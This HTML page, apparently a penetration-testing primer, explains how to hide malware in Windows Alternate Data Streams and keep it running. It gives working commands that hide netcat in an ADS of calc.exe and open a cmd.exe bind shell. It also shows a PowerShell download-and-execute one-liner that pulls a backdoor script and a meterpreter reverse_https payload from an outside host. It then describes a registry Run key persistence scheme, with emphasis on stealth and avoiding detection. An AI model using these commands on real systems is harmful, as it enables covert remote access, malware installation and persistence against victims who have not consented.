<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Primer</title>
</head><body>An Alternate Data Stream can be used to hide the presence of secret or malicious files inside a legitimate file. By putting malware in an ADS, Windows will contain information for the legitimate file as well as the malicious file.<br/>
<br/>
For example:<br/>
C:\&gt;type C:\nc.exe &gt; C:\windows\system32\calc.exe:svchost.exe<br/>
<br/>
C:\&gt;start /B C:\windows\system32\calc.exe:svchost.exe -d -L -p 2222 -e cmd.exe<br/>
<br/>
The above commands will hide nc.exe in an Alternate Data Stream for calc.exe called svchost.exe and then start nc.exe from the ADS associated with calc.exe. Microsoft found this as an issue and removed the ability to run anything from ADS starting after Windows XP. In order to run your code that resides in an ADS, you would want to create a symlink using the mklink command. While this works, you have to have administrative rights on the machine in order to create the symlink. We all know users are not supposed to be running as an admin, so I tend to approach attack methods with the assumption that I will land on a box without admin rights.<br/>
<br/>
<br/>
This persistence method contains two items that almost all Penetration Testers like: The method’s ability to operate as a standard user and the ability to avoid detection. It is also important to know that <b>Alternate Data Streams cannot be viewed unless you specify the /a /r command when doing a directory listing</b>. This is appealing because of the stealth the ADS provides.<br/>
&nbsp;<br/>
Once you have compromised a machine, you can run the above Powershell script. The script takes two parameters: -URL and -Arguments. <br/>
-URL is the URL to your payload and <br/>
-Arguments is for storing any parameters your payload requires. <br/>
<br/>
When specifying the arguments, you have to quote them. It will look similar to this: -Arguments “BadFunction -Lhost 192.168.1.11 -LPort 3333 -Payload weeeeee”. Note the “BadFunction” portion of the Arguments. If your Powershell script contains a function, you must include it as an argument. <br/>
&nbsp;<br/>
Running this script on a compromised machine will look something like this. Depending on your payload, the string complexity will change. Here is an example that executes a payload with the function “hack” with no arguments. The function simply executes calc.exe<br/>
<br/>
Here is an example that uses the script and passes Invoke-Shellcode as an argument<br/>
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.138/Invoke-ADSBackdoor.ps1'); Invoke-ADSBackdoor -URL http://192.168.1.138/Invoke-Shellcode.ps1 -Arguments 'Invoke-Shellcode -LHost 192.168.1.138 -LPort 666 -Payload windows/meterpreter/reverse_https -Force'"<br/>
<br/>
After running the script, it will do the following:<br/>
<br/>
-Encode the Powershell command that will execute your payload<br/>
-Create an Alternate Data Stream under the AppData folder and inject the Powershell Payload into it<br/>
-Create a VBS wrapper that will parse and execute the contents of the Alternate Data Stream containing the payload<br/>
-Create a second Alternate Data Stream under the AppData folder and inject the VBS wrapper into it<br/>
-Create a registry entry called “Update” in HKCU:\Software\Microsoft\Windows\CurrentVersion\Run<br/>
<br/>
When the user logs on next, the Registry key will use wscript.exe to execute the Alternate Data Stream for the VBS wrapper. Once executed, the VBS wrapper will parse through and execute the contents of the Alternate Data Stream containing the payload.<br/>
<br/>
<br/>
As a recap, here is how this works. <br/>
Run the Powershell script and specify a payload URL and any Arguments for the payload. The arguments need to be in quotes. <br/>
The script will encode the Powershell command and inject it into an Alternate Data Stream under C:\Users\{username}\AppData while using a randomly generated file name. <br/>
It will then inject some VBScript into a 2nd Alternate Data Stream that parses and executes the ADS containing the payload and then suppresses the console on execution. <br/>
Once both Alternate Data Streams exist, it will then create a registry key that will use wscript.exe to run the Alternate Data Stream containing the VBS wrapper. When the VBS wrapper is executed, it will parse the Alternate Data Stream that contains the payload and execute it.<br/>
<br/>
Remember, this persistence method works for standard user accounts and is fairly difficult to track down if you don’t know what to look for.</body></html>